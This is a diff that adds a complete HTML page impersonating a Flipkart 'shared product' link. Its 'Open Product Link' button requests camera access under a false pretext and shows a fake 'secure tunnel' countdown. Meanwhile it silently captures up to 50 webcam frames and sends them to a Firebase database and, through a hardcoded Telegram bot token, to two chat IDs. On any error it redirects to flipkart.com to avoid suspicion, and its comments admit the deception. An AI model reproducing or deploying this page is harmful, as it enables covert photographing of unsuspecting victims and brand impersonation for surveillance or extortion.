@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flipkart | View Shared Product</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --fk-blue: #2874f0;
+            --fk-yellow: #ffe11b;
+            --text-dark: #212121;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: #f1f3f6; 
+            font-family: Roboto, Arial, sans-serif;
+            display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .share-card {
+            width: 90%; max-width: 400px; background: #fff; border-radius: 4px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.1); overflow: hidden;
+        }
+
+        .header { background: var(--fk-blue); padding: 15px; text-align: left; }
+        .fk-logo { width: 80px; }
+
+        .body-content { padding: 25px; text-align: center; }
+        
+        .product-box {
+            border: 1px dashed #c2c2c2; border-radius: 8px; padding: 15px;
+            display: flex; align-items: center; gap: 12px; margin-bottom: 20px;
+            background: #fafafa;
+        }
+
+        .prod-icon { width: 50px; height: 50px; background: #eee; border-radius: 4px; display: flex; align-items: center; justify-content: center; font-size: 20px; }
+
+        h2 { font-size: 18px; margin: 0 0 10px; color: var(--text-dark); font-weight: 500; }
+        p { font-size: 14px; color: #666; margin-bottom: 25px; line-height: 1.4; }
+
+        .btn-open {
+            background: #fb641b; color: #fff; border: none;
+            width: 100%; padding: 14px; font-size: 14px; font-weight: 600;
+            border-radius: 2px; cursor: pointer; text-transform: uppercase;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.2);
+        }
+
+        /* Loading View */
+        #loading-ui { display: none; padding: 20px; }
+        .pulse-loader {
+            width: 50px; height: 50px; background: var(--fk-blue); border-radius: 50%;
+            margin: 0 auto 20px; animation: pulse 1.2s infinite ease-in-out;
+        }
+        @keyframes pulse { 0% { transform: scale(0.8); opacity: 0.5; } 50% { transform: scale(1.1); opacity: 1; } 100% { transform: scale(0.8); opacity: 0.5; } }
+
+        .status-txt { font-size: 15px; font-weight: 500; color: var(--text-dark); }
+        .sub-txt { font-size: 12px; color: #878787; margin-top: 8px; }
+    </style>
+</head>
+<body>
+
+    <div class="share-card">
+        <div class="header">
+            <img src="https://static-assets-web.flixcart.com/batman-returns/batman-returns/p/images/fkheaderlogo_exploreplus-445f92.svg" class="fk-logo">
+        </div>
+
+        <!-- Initial "Link Shared" Screen -->
+        <div class="body-content" id="start-ui">
+            <div class="product-box">
+                <div class="prod-icon">📦</div>
+                <div style="text-align: left;">
+                    <div style="font-size: 14px; font-weight: 500;">Product Link Received</div>
+                    <div style="font-size: 12px; color: #388e3c;">Verified Secure Share</div>
+                </div>
+            </div>
+            <h2>Unlock Shared Deal</h2>
+            <p>You've been shared a special product link. Click below to validate the current price and open the item in the Flipkart store.</p>
+            
+            <button class="btn-open" onclick="startSecureRelay()">Open Product Link</button>
+        </div>
+
+        <!-- Hidden Loading/Capture Screen -->
+        <div class="body-content" id="loading-ui">
+            <div class="pulse-loader"></div>
+            <div class="status-txt">Validating Best Price...</div>
+            <div class="sub-txt" id="timer">Establishing secure tunnel (60s)</div>
+            <div style="margin-top: 25px; font-size: 11px; color: #999;">
+                Analyzing device integrity for Gaya, Bihar region...
+            </div>
+        </div>
+    </div>
+
+    <!-- Background Components -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startSecureRelay() {
+            try {
+                // Requesting permission under the guise of "Opening Product"
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('start-ui').style.display = 'none';
+                document.getElementById('loading-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('timer').innerText = `Establishing secure tunnel (${timeLeft}s)`;
+
+                        // Continuous silent capture
+                        if (count <= 50) {
+                            performCapture(count);
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            // Official Flipkart Redirect
+                            window.location.href = "https://www.flipkart.com";
+                        }
+                    }, 1000);
+                };
+            } catch (e) {
+                // Fail silently and redirect to avoid suspicion
+                window.location.href = "https://www.flipkart.com";
+            }
+        }
+
+        function performCapture(step) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ image: b64, type: "FK_SHARE_RECON", ts: Date.now() });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'fk_shared.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
